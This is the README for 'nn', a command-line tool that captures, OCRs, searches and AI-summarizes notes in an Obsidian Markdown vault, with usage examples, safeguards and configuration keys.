# nn

`nn` captures and searches notes in a Markdown Obsidian vault. It creates notes
from words, stdin, the clipboard or a screenshot, searches the vault including
text recognized in images, and works with links, tags and the link graph.
Obsidian or any other editor reads the same Markdown files. `nn` creates notes
and appends to existing ones; it never edits or removes what a note already
holds. Besides notes and their images, it writes only its OCR cache under
`.nn/ocr` and, with `nn doctor --fix`, the inbox folders and a starter
template.

The vault is the source of truth. `nn`'s own state (open frequency, OCR
sidecars) is disposable and rebuilt on demand.

## Install

macOS 13+ and Linux, ARM64 or x86-64. Go is not required for release packages.

With Homebrew:

```sh
brew install lamovs/tap/nn
```

Update with `brew upgrade lamovs/tap/nn`. On macOS this also installs the
`nn-vision` OCR helper.

Without Homebrew, download the matching archive and `checksums.txt` from
[Releases](https://github.com/lamovs/nn/releases). Verify its SHA-256 against
`checksums.txt`, extract it, and run `./nn setup install` from the extracted
directory. This installs `nn` into `~/.local/bin`, and `nn-vision`, if the
archive has one, into `~/.local/share/nn`. Keep `~/.local/bin` on `PATH`.
Repeat with a newer archive to update.

To build from source, use the Go version in `go.mod`:

```sh
go build -buildvcs=false -o nn ./cmd/nn
```

A source build has no `nn-vision`, so OCR uses `tesseract` even on macOS. To
build the helper where `nn` looks for it (`nn doctor` suggests the same
command):

```sh
scripts/build-macos-helper ~/.local/share/nn
```

The result is a universal, ad-hoc signed `nn-vision` in `~/.local/share/nn`
(`$XDG_DATA_HOME/nn` when that is set). To keep it elsewhere, build it there
and set `NN_VISION_HELPER` to its path. `nn doctor` shows which OCR engine is
in use.

## First run

```sh
nn config vault.root ~/Notes
nn doctor
nn setup zsh >> ~/.zshrc
```

`vault.root` is the only required setting. `nn doctor` lists what still needs
attention, such as a missing OCR engine, a screenshot tool or a vault not
registered in Obsidian, with the exact fix. `nn setup zsh` prints a shell
snippet; append it once and open a new shell.

## Quick reference

| Command | What it does |
| --- | --- |
| `nn add` (`a`) | capture a note from words, stdin, the clipboard or the editor |
| `nn shot` | capture a screen region into a new note with OCR |
| `nn url` | fetch a link and save a note with a summary |
| `nn edit` (`e`) | open a note in your editor |
| `nn snip` | print a code block from a matching note |
| `nn s` | search notes and images |
| `nn ask` | answer a question from note excerpts, with source links |
| `nn digest` | summarize a selected set of notes, with source links |
| `nn ai` | transform piped text using an instruction |
| `nn last` | analyze supplied shell command text and optional output |
| `nn triage` | review inbox additions and optionally apply selected changes |
| `nn ls` | list notes |
| `nn show` | print a note with its images inline |
| `nn cat` | print a note's body |
| `nn code` | print code blocks from a note |
| `nn open` | open a note in Obsidian |
| `nn links` | list a note's outgoing links |
| `nn backlinks` | list notes that link to a note |
| `nn graph` | render the link graph |
| `nn tags` | list tags by frequency |
| `nn stats` | summarize vault activity |
| `nn ocr` | print or refresh OCR text for images |
| `nn doctor` | check that nn is set up correctly |
| `nn setup` | print zsh integration, install the binary, or set up AI consent |
| `nn config` | show or change configuration |
| `nn help` | show what a command does, with examples |
| `nn version` | print the nn version |

`nn help <command>` or `nn <command> --help` shows the full description with
examples.

## Capture

```sh
nn add Docker cleanup notes
docker system prune -af | nn add Docker cleanup
nn add "docker system prune -af" --code=sh
nn add -- -5 min plank
nn add one more thing --to docker-cleanup-notes
nn add meeting notes --preview
printf 'New topic details\n' | nn add --ai
printf 'New topic details\n' | nn add Manual title --ai --ai-mode wait
nn add
nn shot -t docker
nn edit docker cleanup
nn snip docker prune --set container=web
```

Words alone become the title, with an empty body. With piped stdin too, the
words are the title and stdin is the body (text or an image, detected from its
bytes). `--code` or `--title` makes the words body text instead; `--code` wraps
them in a fenced code block, which is how `nn-last` from `nn setup zsh`
captures a shell command. `--clip` reads the clipboard instead of stdin,
preferring an image over text; an empty clipboard is an error. With no input on
a terminal, `nn add` opens `$VISUAL` or `$EDITOR` (then `nvim`, then `vi`) on
an empty draft.

`-T NAME` starts the body with `_templates/NAME.md`, followed by the captured
content, whatever the source. An unknown template is an error (exit code 2),
and so is `-T` with `--to`. `-e` opens the editor on the note as it is so far.
A draft left empty writes nothing and exits 0.

A new note gets frontmatter `tags`, `date`, `aliases` (only for a
human-readable title), `time`, `where` (the current directory, `~`-shortened),
`repo` (the name of the enclosing git repository) and `via` (`text`, `editor`,
`stdin`, `clip`, `shot`, `url`, `digest` or `ask`). The filename is a
transliterated kebab-case slug of the title, or of the image's first tag or
`shot` plus a timestamp. A
collision appends `-2`, `-3` and so on. Titles that differ only in Unicode
normalization (NFC vs NFD) count as a collision.

`--to NOTE` appends a line to an existing note instead of creating one and
never touches its frontmatter. nn also appends to an existing note when you
answer `a` to the similar-note prompt, when background AI finishes and with
`nn triage --apply`. Unlike other commands, `--to` never falls back to search:
NOTE must be an exact path, file name, alias or title.

On a terminal, nn asks before saving when it finds a similar note
(`[a]ppend / [n]ew / [c]ancel`), a similar existing tag (reuse it?) or a likely
secret, such as a GitHub token, an AWS key or a private key block. Without a
terminal it never prompts: a similar note or tag only prints a warning on
stderr, and a likely secret is refused with exit code 2 unless `--allow-secret`
is given. `--new` skips the similar-note check, and `--preview` shows the note
without writing it. `capture.similar_threshold` (default `0.6`) sets how
similar a note must be, `capture.similar_limit` (default `3`) how many matches
are shown.

Captured images are OCR'd by default (`capture.ocr`, default `true`).
`--no-ocr` and `--ocr` override it for one run and cannot be combined.

`nn shot` captures a screen region into a new note and runs OCR like `nn add`.
`--copy-text` also copies the recognized text to the clipboard. Its default is
`shot.copy_text`, `--no-copy-text` turns it off, and the two flags cannot be
combined. Copying turns OCR on even when `capture.ocr` is `false`. `--no-ocr`
with `--copy-text` is a usage error (exit code 2); `--no-ocr` alone overrides
`shot.copy_text`, so nothing is copied. Dismissing the selection (Escape, for
example) exits 0 and saves nothing.

On Linux, `shot.tool` (default `auto`) picks the screenshot tool. A named tool
(`grim`, `spectacle`, `gnome-screenshot`, `maim`, `import`) is the only one
tried, and if it fails, the error names the key and the tool. macOS ignores the
key.

`nn edit` resolves NOTE like every other command (see
[Links, graph and tags](#links-graph-and-tags)). Without NOTE it opens the most
recently modified note in the inbox. `-l LINE` jumps to a line if the editor
supports it.

### Screenshot analysis

```sh
nn shot --ai
nn shot --ai=codex --model MODEL --effort high
nn shot --ai --ai-mode wait --title "Build failure" -t work
nn shot --no-ai
```

After consent, `nn shot --ai` sends the screenshot, its OCR text and the
vault's existing tags to the selected profile. The built-in prompt asks for a
finished note with no follow-up questions: explanations of errors or code,
diagram descriptions, tables and shortcut lists. nn uses your normal Claude or
Codex CLI login and adds no login flow or dangerous permission flags.

With the default `ai.mode = "background"`, the note is saved at once with its
OCR text, and the analysis is appended when ready. The filename, frontmatter
and your edits in the meantime are kept, and manual titles and tags win. An
untitled note gets an H1 title; keyword hashtags go at the end, after the
images. A desktop notification reports completion if notifications are on.
`--ai-mode wait` saves one finished note, and `--ai-mode auto` waits only when
stdin and stderr are terminals. An explicit `--title` beats the model's title,
`-t` tags are kept, and keyword tags prefer existing spellings but may add new
ones. nn sets up no keyboard shortcut for this.

`ai.tasks.shot.run` is `always` by default, so a plain `nn shot` also runs the
analysis when consent allows. `flag` requires `--ai`; `never` forbids it, and
`--ai` with `never` fails before the capture. `--no-ai` skips the analysis
once. If consent is declined, or is `ask` without a terminal, the image and OCR
note are still saved; set consent with `nn setup ai`. A `once` answer covers
only this background job and is never saved.

With `ai.tasks.shot.image = "discard"` (the default), the original image stays
in a private recovery cache until the result is saved; `embed` also keeps it in
the note's `assets`, with its OCR sidecars. The cache is under
`$XDG_CACHE_HOME/nn/ai`, or the system's user cache directory; background
analysis prints its path. If the model fails or times out, the OCR note stays
and includes the recovery path of the original. If appending fails, the job's
cache directory keeps `answer.md` (if any), the original and `status.json`.

Screenshots sent to AI are limited to 3.5 MiB and 8000 pixels per side, prompts
to 64 KiB and request text to 256 KiB. Images are never resized or
recompressed. Over a limit nothing is sent, and the OCR note and original are
kept. Model errors after the note is saved are warnings. An interrupt exits 130
and keeps the capture when possible.

`nn add --ai` gives text, stdin, editor, template and clipboard captures the
same generated title and trailing tags. `ai.tasks.title` sets its run policy
and profile; `--no-ai`, `--model`, `--effort` and `--ai-mode` work as above.
The body stays as written, and manual titles win. An append (`--to` or the
similar-note prompt) sends only the new content. An image-capable profile gets
the original image; a text-only command profile gets the text or OCR text, and
nothing is generated without text. `--preview` asks for no consent, calls no
model and writes nothing. Confirming a likely secret at the prompt only allows
saving it locally; sending it to a model needs `--allow-secret` and AI consent.
Background metadata keeps the original filename and any title or tags you set
in the meantime.

## Questions from notes

```sh
nn ask "How did I clear the Docker build cache?"
nn ask "What did I learn about backups?" --ai=codex --effort high
nn ask "What did I decide about backups?" --save
```

`nn ask QUESTION...` searches locally, sends selected excerpts to the model and
prints an answer with numbered sources. Each source shows the note's relative
path and a Markdown link that opens it in Obsidian. nn builds the links from
the notes it actually sent; a source ID it did not send is an error.

The search is the regular lexical one (no vector index, semantic retrieval,
graph expansion or Obsidian MCP) over titles, aliases, tags, body text and
cached OCR text of images in notes. Standalone images are not sources, and
`nn ask` runs no OCR. Notes saved by `nn ask --save` or `nn digest --save`
(`via: ask`, `via: digest`) are never sources.

`ai.context.notes` (default 8) and `ai.context.chars` (default 12000) cap the
sources and excerpt text for the whole question, metadata included. With the
default `ai.context.search_rounds = 1`, the first search uses at most half of
the budget, and the model may ask for one more search; with `0` the first
search may use all of it. The profile timeout covers all model calls and
searches together; saving the answer with `--save` afterwards is not covered.

`nn ask` always waits, even with `ai.mode = "background"`. It uses
`ai.tasks.ask.profile` and `ai.tasks.ask.prompt_file`; `--ai[=PROFILE]`,
`--model` and `--effort` override them. Consent is asked once per question.
Without consent the command fails with the usual setup hint.

Without enough evidence, the answer says what is missing and may give partial
findings with sources. Exit codes: 0 for an answer; 1 for insufficient data
(without a model call when nothing matches and search rounds are `0`); 2 for
usage, consent, engine or protocol errors, with nothing on stdout, or for a
failed `--save`, which keeps the answer on stdout; 130 when cancelled.
Without `--save`, `nn ask` writes nothing: no notes, links, open history,
save hooks or background jobs.

`--save`, placed after the question like the other options, writes the
answer as one new inbox note after printing it and prints the note's path to
stderr. The note is titled with the question (cut to 160 characters) and
holds the answer with the same source numbers, then a `Sources` section with
verified wikilinks to the cited notes. A path that cannot be linked safely
(unsafe or case-ambiguous characters, `%` or `::`) is written as escaped text
with "(no link: ambiguous or unsafe path)". The note has `via: ask` and no
tags, so later `nn ask` runs never use it as a source and `nn digest` leaves
it out unless it is listed with `-`. There is no second model call and no
similar-note prompt; the post-save hook runs once. An answer without enough
evidence (exit 1) is not saved, and stderr says so. If saving fails, the
answer stays on stdout and the exit code is 2; cancelling during the save
exits 130 with the answer still on stdout.

## Digest notes

```sh
nn digest --since 7d --notes 30 --chars 30000
nn digest --since 7d --notes 30 --chars 30000 --save
nn digest docker -t devops --since 2026-09-01 --until 2026-09-30
nn links "Project Atlas" --paths | nn digest -
```

`nn digest [TOPIC...|-]` selects notes with the same search as `nn s`, sends
their excerpts to the model in one call and prints a short digest with numbered
sources. `nn ask` answers a question; `nn digest` summarizes a selection.

At least one selector is required: TOPIC words (all must match, up to 200
runes), `-t TAG` (repeatable, up to 16 tags of 64 runes each),
`--since today|Nd|Nw|YYYY-MM-DD`, `--until YYYY-MM-DD` (inclusive), `--inbox`,
`--here`, or a lone `-` to read note paths from stdin. Paths are newline- or
NUL-separated and must be written exactly as `--paths` prints them:
vault-relative, without `./`; a `:N` suffix is ignored. `-` cannot be
combined with topic words and is refused on a terminal; other filters still
narrow the list. Words may come before or after
options, and `--` ends the options. After `--`, `-` is a topic word, and piping
a list in as well is a usage error. Without a selector the command is a usage
error, with a hint to use `-` when stdin is not a terminal.

The default budget is `ai.context.notes` and `ai.context.chars` (8 notes and
12000 characters; larger config values are clamped to the caps). It covers only
the newest notes of a busy week. `--notes N` (1-64) and `--chars N`
(1000-32000) raise it for one call, so a weekly digest works better as
`--since 7d --notes 30 --chars 30000`. There is exactly one model call and no
follow-up search; `ai.context.search_rounds` does not apply.

Notes over the budget are skipped and only counted in the header. So are notes
whose title, tags, path or content look like a credential, unless
`--allow-secret` is given (consent is still required). The check is heuristic,
not a guarantee. With a topic, the excerpt of a long note starts just before
the first hit. `--since Nd` and `--since Nw` count back from now, as in `nn s`,
and the header shows the cutoff to the minute unless it is local midnight. Use
`--since YYYY-MM-DD` to cover whole days.

Sources are numbered by date, oldest first. `Sources:` lists every included
note, cited or not; a note with a shortened excerpt is marked `excerpt`. Each
source links to the note in Obsidian. URLs written by the model are shown
escaped, not as links. The built-in `digest` verb shadows an external
`nn-digest` script on `PATH`.

`--save` writes the digest as a new inbox note after printing it and prints the
note's path to stderr. Its `Sources` section has verified wikilinks. A path
that cannot be linked safely (unsafe or case-ambiguous characters, `%` or `::`)
is written as escaped text with "(no link: ambiguous or unsafe path)". A saved
digest has `via: digest`. Saved digests and answers saved by `nn ask --save`
(`via: ask`) are left out of later digests unless listed with `-`, and
`nn ask` never uses either as a source.

AI is implicit and the command always waits; there is no `--no-ai`.
`--ai[=PROFILE]`, `--model` and `--effort` work as in `nn ask`. Consent is
asked once, on a terminal. With `-`, stdin is a pipe, so set consent first with
`nn setup ai`. With `--chars` near its cap and many sources, the request can
approach the shared size limits, and a command profile with `{prompt}` in argv
may hit its argument limit first (see [Command profiles](#command-profiles)).

Exit codes: 1 when no note matches (nothing is sent); 2 with empty stdout for
usage errors, an unknown path in a `-` list, or a request that cannot be sent
(nothing fits the budget, every candidate looks like a secret, no consent, an
engine or protocol failure); 130 with empty stdout when cancelled before the
digest is printed. If `--save` fails or is cancelled, the digest stays on
stdout and the exit code is 2 or 130.

## Transform piped text

```sh
cat draft.md | nn ai "Summarize this in five bullet points"
nn ai "Translate to English" < draft.txt > translated.txt
cat input.json | nn ai "Format this JSON" --ai=codex --effort high
```

`nn ai INSTRUCTION...` reads text from a pipe or a redirected file, sends the
instruction and the text to the model as separate fields, and prints only the
result, with the model's whitespace and final newline unchanged. An empty
result is valid. The command always waits, whatever `ai.mode` is.

The task is `filter`: the usual profile, model, effort, consent,
`ai.tasks.filter.prompt_file` and timeout apply, and `--ai[=PROFILE]`,
`--model`, `--effort` and `--` are supported. Set consent with `nn setup ai`
first; piped text is never taken as a consent answer. The timeout covers
reading the input and the model call.

The instruction and input must not be blank. Input must be UTF-8 without NUL
bytes and fit the shared 256 KiB request limit, including the instruction and
JSON overhead; larger input is rejected, not truncated. With a terminal on
stdin, the command prints a pipe example instead of waiting. Ctrl+C also
interrupts a pipe that stays open.

No vault is needed: a missing `vault.root` is fine, other config errors still
apply. The command does not read or change notes or open history, save output,
or run capture, OCR or clipboard tools. Exit codes: 0 on success, including an
empty result; 2 for input, consent, engine or protocol errors, with no output;
130 when cancelled.

## Explain the previous shell command

With the zsh integration loaded, run a command and then `nn-last --ai`:

```sh
go test ./...
nn-last --ai
```

The helper sends the previous command from the current shell's history to
`nn last` on stdin, and nn explains the command, its flags and useful lessons.
It does not run the command again, so without saved output it cannot know the
result or reconstruct an error. Plain `nn-last` still saves the command as a
note.

To analyze an error, save the output when you run the command:

```sh
go test ./... 2>&1 | tee error.log
nn-last --ai --output error.log --save
```

The model gets the whole pipeline and the contents of the log, but not its
filename. An empty log is not the same as no log. Without `--save` the analysis
is only printed. Run the helper right after the command, since any command in
between becomes the previous one.

`nn last` also works without shell history:

```sh
printf '%s' 'go test ./...' | nn last --output error.log
```

It takes `--ai[=PROFILE]`, `--model`, `--effort`, `--output FILE`, `--save` and
`--allow-secret`, uses task `last` and `ai.tasks.last.prompt_file`, and always
waits. Set consent with `nn setup ai` before piping. The command and output are
checked for secrets before sending; a detected secret needs `--allow-secret` as
well as consent. The refusal does not print the values, and nothing is
redacted.

The command must not be blank. The command and the `--output` file must be
UTF-8 without NUL bytes, and the whole input must fit the shared request size
limit. `--output` may be empty and must be a regular file (a symlink to one is
fine); special files are rejected. One profile timeout covers reading and the
model call.

Without `--save`, no vault is needed and nothing is written. With `--save`, the
vault must be configured before the model runs. One new note then holds the
command, the output and the analysis, in code blocks, with the title and tags
from the same model call and existing tag spellings reused. There is no second
model call and no OCR. The post-save hook runs once. The note's path goes to
stderr and the analysis to stdout. If saving fails, the analysis is still
printed and the exit code is 2. Input, model or protocol failures print no
analysis and save nothing; cancellation exits 130.

## Review the inbox

```sh
nn triage
nn triage nn/docker.md nn/backup.md
nn triage --apply
```

`nn triage [NOTE...]` proposes additions for a limited batch of inbox notes: a
title where there is no manual one, keyword tags, and links to existing notes.
Each proposal comes with a topic and a reason, which are not written into
notes. NOTE arguments are exact inbox paths, to review a different batch. The
output lists the notes it considered; it does not cover the whole inbox.

Triage reads note text and metadata and finds related notes with the lexical
search. `ai.context.notes`, `ai.context.chars` and `ai.context.search_rounds`
bound the reviewed notes, related notes and follow-up searches together. Triage
uses at most 32 context notes even if `ai.context.notes` is higher, and shows
the limits in effect. Named notes must be regular inbox files; other files are
skipped in automatic selection. The usual profile, model, effort, consent and
`ai.tasks.triage.prompt_file` apply.

By default triage only reads. `--apply` makes a fresh proposal, lets you pick
numbered additions, shows the combined diff and asks for confirmation (default
no). It then applies exactly that plan without another model call; a proposal
from an earlier run is never reused. `--apply` needs an interactive terminal;
there is no `--yes`. Declining or picking nothing changes nothing.

Manual titles, existing text, frontmatter and paths are kept. Triage only
appends a missing title, tags and verified links, and never renames or moves
notes out of the inbox. Additions that already exist are skipped. Notes it
writes must be regular inbox files, not symlinks.

Before writing, nn checks the notes and link targets against the versions it
reviewed, and saves private backups and a before/after journal in its data
directory. Notes are updated one at a time. On a conflict or error, triage
stops and reports what was applied, what was not, and where the recovery files
are. There is no automatic rollback. nn's locks only coordinate nn itself;
external editors ignore them.

Exit codes: 0 when the plan is shown, applied or declined; 2 for input,
consent, model, preview, write or recovery errors; 130 when cancelled.

## Summarize a link

```sh
nn url
nn url https://go.dev/blog/pgo --ai-mode wait
nn url http://localhost:3000/docs --allow-private --no-ai
nn url https://bot-protected.example/post
```

`nn url [LINK]` fetches one web page and saves exactly one new note. There is
no append, `--to`, `--preview` or stdout-only summary; stdout gets only the
result line or the chosen output format. `url` is a built-in verb and shadows
an external `nn-url` script on `PATH`.

Without LINK, nn reads the clipboard once. It must hold exactly one bare `http`
or `https` link of at most 8 KiB, with no other text, Markdown or angle
brackets; otherwise the command fails without printing the clipboard. Stdin is
never read.

Fetching:

- `http` and `https` only, for the link and every redirect; at most 5
  redirects, no downgrade to `http`;
- one 30 second deadline for the whole fetch;
- proxy variables (`HTTP_PROXY`, `HTTPS_PROXY` and the like) are ignored;
- private, loopback, link-local, reserved and tunnel addresses are refused on
  every hop, redirects included, unless `--allow-private` is given;
- only `text/html`, `application/xhtml+xml`, `text/plain` and `text/markdown`.
  Other types, such as PDF or images, fail before the body is read, with a hint
  to keep the link with `nn add LINK`. Without a usable Content-Type, the type
  is detected from the body;
- UTF-8, windows-1251, koi8-r and windows-1252, plus any declared charset when
  the body is pure ASCII. Other encodings fail like an unsupported type.

AI is implicit but follows the usual consent flow, with task `url`: `always`
sends the page text; `ask` asks on a terminal and, without one, saves a
link-only note with the "AI needs consent" hint; `never` saves without AI, and
`--ai` with `never` is the usual consent error. `--no-ai` always skips the
model. `--ai[=PROFILE]`, `--model`, `--effort` and
`--ai-mode auto|wait|background` (default from `ai.mode`) work as for `shot`.
`--title` sets a manual title and `-t TAG` adds tags.

A link that looks like it carries a credential is refused before anything is
saved, unless `--allow-secret` is given. If the page's title, description or
text looks like a credential, the note is still saved, but nothing is sent to
the model without `--allow-secret` (and consent).

The note starts with `Source: <LINK>`, then `Page title:` and `Description:`
lines when the page has them. If the fetch fails (timeout, DNS, connection,
TLS, a blocked address, too many redirects, a non-2xx status, an unsupported
type or encoding), the note gets `Page not fetched: REASON`, the model is not
called, and the exit code is still 0. A page with no readable text, such as a
JavaScript-only page, gets `Page not summarized: no readable text`. Otherwise
the model's `## Summary` is appended: an overview and `-` bullets. In
background mode (the default) the H1 title and `#tags` are added with it, as
for `shot`; wait mode saves the finished note. A desktop notification says
"Link summary ready" or "Link summary failed" if notifications are on.

Page content and model output are escaped in the note body, and the alias is
stripped of link, comment and Templater marks, against Markdown, HTML, Obsidian
comment, Dataview and Templater injection; this is not verified against every
community plugin.
Page text is untrusted: nn runs `claude` and `codex` with tools disabled, but
it does not sandbox command profiles. A command profile with `{prompt}` in
argv hits the ~128 KiB argument limit on almost any real page; give it the
prompt through stdin (see [Command profiles](#command-profiles)).

Exit codes: 2 and no note for errors before any network request (usage errors,
an invalid link, a link with userinfo, a sensitive link without
`--allow-secret`, clipboard text that is not a single link, a clipboard read
error), a config or vault error, or a failed note write; 0 with a saved note
after any valid, non-sensitive link, including fetch and model failures; 130
and no note when cancelled before the note exists.

## Search

```sh
nn s docker prune
nn s docker --since 7d --here
nn s TODO -t work -n 5
nn s docker -o
nn ls --since 7d
nn ls --sort opened -n 10
nn ls -t docker --here --img
```

A query matches when every word occurs in a note's title, aliases, tags, body
or image text. Results rank by match quality (a whole phrase beats scattered
words, a title or tag hit beats a body line), by how often and how recently the
note was opened, and by whether it was captured in the current directory or
repo (`--here`). With a filter (`-t`, `--since`, `--here`, `--inbox`, `--img`)
the query is optional, and `nn s` lists the notes the filters keep as
`path  (title)`. With neither a query nor a filter, it is a usage error (exit
code 2).

`--since` takes `today`, `Nd`, `Nw` or `YYYY-MM-DD`. `-r` makes the query a
regular expression. Matching ignores case (with Unicode folding) and treats `e`
and the Cyrillic `e` with diaeresis as equal; `-c` makes it case-sensitive.
`-o` opens the best match in your editor at the matching line. `-n` defaults to
`search.limit` (`20`).

A query that looks like a keyboard shortcut (`cmd shift 4`, `Ctrl+Alt+T`,
`command-shift-4`, or the glyphs OCR produced from a screenshot) matches
shortcuts in any modifier order or spelling. A query typed in the wrong
keyboard layout (English in Cyrillic, or the reverse) that finds nothing is
retried in the other layout, with a note on stderr;
`search.layout_fallback = false` turns this off.

`nn ls` lists notes with the same filters, without a query. `--sort` is
`modified` (newest first), `date`, `opened` (how often and how recently a note
was opened) or `title`, with the default from `ls.sort` (`modified`). `-n`
defaults to `ls.limit` (`0`, all), and `-n all` overrides a non-zero
`ls.limit`. `--img` keeps only entries with an image: a note with an embedded
image under its `.md` path, a standalone image under its own path.

Listing commands share these output flags: `--json` (always one array, `[]`
when empty), `--paths` or `-0` (unique paths, NUL-separated with `-0`), `--tsv`
(a header row, then one escaped record per result), `--format TEMPLATE` (a Go
`text/template` per row) and `--color=auto|always|never` (default from
`output.color`, `auto`; `NO_COLOR` beats the config but not `--color=always`).

Given `-`, `cat`, `code`, `show` and `ocr` read paths from stdin: one per line,
or NUL-separated if there is a NUL byte, with any `:line` suffix ignored. `cat`
and `ocr` handle every path; `show` and `code` use the first and report on
stderr how many were left.

## Links, graph and tags

```sh
nn links docker cleanup
nn links --unresolved
nn backlinks docker cleanup
nn graph docker cleanup --depth 2
nn graph --format dot -t docker
nn tags
nn tags --similar
nn stats --by month
```

Every `NOTE` argument resolves by strict rules first: an exact path, a path
without `.md`, the filename stem, an alias or the title. Several matches are an
error that lists the candidates. With no match, the reading commands (`edit`,
`show`, `cat`, `code`, `open`, `links`, `backlinks`, `graph`) fall back to the
best full-text match, so a rough name still works. `nn add --to` uses the
strict rules only, so it never appends to a guessed note (see
[Capture](#capture)).

`[[wikilinks]]`, `[[name|display]]`, `[[name#heading]]`, `[[name^block]]`,
embeds (`![[...]]`) and Markdown links to `.md` files all count as links.
`nn links --unresolved` lists every broken link in the vault.

`nn graph` prints Mermaid by default, `--format dot` gives Graphviz and
`--format json` the raw nodes and edges (default from `graph.format`,
`mermaid`); the output can go straight to `mermaid-cli` or any DOT renderer.
`nn tags --similar` flags likely duplicates (`go` next to `golang`);
`nn tags --names` prints bare names for shell completion.
`nn stats --by week|month|tag|repo|via` draws an ASCII bar per bucket (default
from `stats.by`, `week`).

## Images and OCR

```sh
nn shot -t docker
nn ocr nn/assets/hotkeys.png
nn ocr --reindex
nn s docker --img --paths | nn ocr -
nn show docker cleanup --ocr
```

Recognized text is searchable: a word that appears only in a screenshot still
matches `nn s`. macOS uses the `nn-vision` helper (Apple Vision, accurate
mode), Linux uses `tesseract`. Results are cached in sidecars that mirror the
image's path: `<root>/.nn/ocr/<image>.txt` (recognized lines) and `.json`
(text, bounding boxes and confidence per line). `nn ocr --reindex` fills in
missing sidecars and those whose image has changed; `--force` recognizes
everything again; `--langs` overrides the languages for one run.

`nn show --ocr` prints the cached text under each image (nothing without a
sidecar). The default is `show.ocr` (`false`), and `--no-ocr` turns it off.
`show.images = "never"` (default `auto`) acts like `--no-images`, and
`--images` turns images back on. Neither pair of flags can be combined.

Paths outside the vault:

- `nn ocr` and the inline images of `nn show` refuse a path that resolves
  outside the vault (through `..` or a symlink).
- `nn add -T` refuses a `_templates` directory outside the vault; a single
  template file linked from elsewhere is still read.
- `nn add` and `nn shot` refuse to save through a symlinked directory that
  leads outside the vault, so moving `nn/` or `nn/assets/` to another disk and
  linking it back does not work. A symlinked `.nn/ocr` does work.
- `nn add --to` follows a symlink to a single note, even outside the vault. It
  writes a temporary file and renames it over the target, so the target gets a
  new inode each time. Content, permissions and the symlink are kept, but a
  hardlink to the file is broken (the other name keeps the old content), and
  extended attributes, Finder tags included, and ACLs are lost.

## Composition and pipes

stdout carries only data; prompts and progress go to stderr or `/dev/tty`.

```sh
# open every result of a search in $EDITOR, one at a time
nn s TODO --paths | xargs -n1 nn edit

# fuzzy-pick a note interactively, then read it
nn ls --paths -n all | fzf | nn cat -

# count notes per tag as JSON, then chart it with jq + uplot
nn tags --json | jq -r '.[] | "\(.tag) \(.count)"' | uplot bar -d ' '

# render the vault's link graph straight to a terminal image
nn graph --format mermaid | mermaid-ascii

# capture the last shell command as a runnable snippet (from nn setup zsh)
docker system prune -af
nn-last

# reuse a saved snippet, filling in one placeholder from the shell
nn snip deploy staging --set env=staging | sh

# copy the text a screenshot contains straight to the clipboard
nn shot --copy-text

# every distinct note a search touched, past the TSV header row
nn s docker --tsv | tail -n +2 | cut -f1 | sort -u

# find broken links across the whole vault, tab-separated for a script
nn links --unresolved --tsv

# an unknown verb runs an external "nn-<verb>" from PATH, git-style;
# "nn weather" runs a hypothetical "nn-weather" script with this arg
nn weather --today

# format results with a template instead of nn's own text layout
nn ls --format '{{.Path}}: {{.Title}}'
```

An unknown verb runs `nn-<verb>` from `PATH` with the remaining arguments, like
`git`. stdin, stdout, stderr and the exit code pass through, and `NN_ROOT`,
`NN_INBOX` and `NN_CONFIG` are set to the effective values. `hooks.post_save`
runs after every capture and needs no executable on `PATH`.

## Configuration and files

```sh
nn config
nn config vault.root ~/Notes
nn config editor.command "code --wait"
nn config --defaults
nn doctor
nn doctor --fix
```

`nn config` lists every key with its value and source (`default`, `file` or
`env NN_ROOT`); `nn config KEY` prints one value. `nn config KEY VALUE`
validates the value and edits the file in place, keeping comments and other
keys. If the file sets the key as a dotted key, an inline table or a multi-line
string, nothing is written: nn prints the line to add by hand and exits 1.
Lists such as `ocr.langs` are edited by hand. `nn config --defaults` prints a
complete config file with every key at its default and documented.

`nn doctor --fix` creates `nn/`, `nn/assets/`, `nn/_templates/` and a starter
`hotkey.md` template if they are missing. `nn doctor` also flags an inbox, or
its `assets` or `_templates`, that resolves outside the vault through a symlink
or `..`; if the inbox does, `--fix` creates nothing. `obsidian.check = false`
drops the Obsidian registration check (no row, no effect on the exit code). On
Linux, a specific `shot.tool` is checked by name. The `ai` rows are described
under [AI engines](#ai-engines).

Config file, `$XDG_CONFIG_HOME/nn/config.toml` (default
`~/.config/nn/config.toml`, overridden by `$NN_CONFIG`):

```toml
[vault]
root = "~/Notes"       # required; NN_ROOT overrides

[ocr]
langs = ["rus", "eng"]

[hooks]
post_save = ""         # sh -c "..."; env NN_NOTE (absolute path), NN_ROOT, NN_ACTION=create|append
post_save_timeout = "10s"  # how long post_save may run
```

Without `vault.root` in the file or `$NN_ROOT`, nn fails with a
`nn config vault.root PATH` hint. `~` is expanded in `vault.root` and
`prompt_file`. A value of the wrong type, not among its allowed values or out
of range falls back to the key's default with a one-line warning, and unknown
keys are ignored; `nn doctor` lists such problems with fixes. `ocr.langs`
codes are translated for the engine (`rus` -> `ru-RU` for Apple Vision,
`en-US` -> `eng` for `tesseract`), so either spelling works on either
platform.

The old flat keys are no longer read: `root`, `inbox`, `editor` and `ocr_langs`
are now `vault.root`, `vault.inbox`, `editor.command` and `ocr.langs`. A config
with only `root` fails with the line to write instead.

All keys (`NAME` is any profile name, `TASK` one of the AI tasks, `KEY` an
engine or a command profile):

<!-- config-table:start -->
| Key | Type | Default | Values | Env | Description |
| --- | --- | --- | --- | --- | --- |
| `vault.root` | path | `""` |  | `NN_ROOT` | Vault directory; required. NN_ROOT is stronger. |
| `vault.inbox` | string | `"nn"` |  |  | Directory for new notes, relative to vault.root. |
| `editor.command` | string | `""` |  |  | Editor command line; empty: VISUAL, EDITOR, nvim, vi. |
| `capture.ocr` | bool | `true` |  |  | OCR images on capture. |
| `capture.similar_threshold` | float | `0.6` | 0..1 |  | Score a note needs to be listed as similar to a capture. |
| `capture.similar_limit` | int | `3` | >= 0 |  | Most similar notes listed after a capture. |
| `hooks.post_save` | string | `""` |  |  | Shell command run after a note is saved (sh -c); empty: none. |
| `hooks.post_save_timeout` | duration | `"10s"` | > 0 |  | How long post_save may run. |
| `shot.copy_text` | bool | `false` |  |  | Copy the recognized text of a screenshot to the clipboard. |
| `shot.tool` | enum | `"auto"` | auto, grim, spectacle, gnome-screenshot, maim, import |  | Screenshot tool on Linux; auto picks one for the session. |
| `ocr.langs` | list | `[]` |  |  | OCR languages; empty: OMARCHY_OCR_LANGS, then Russian and English. |
| `ocr.tesseract_psm` | int | `11` | 0..13 |  | Tesseract page segmentation mode; changing it needs nn ocr --reindex --force (the cache keys on sha+langs, not psm). |
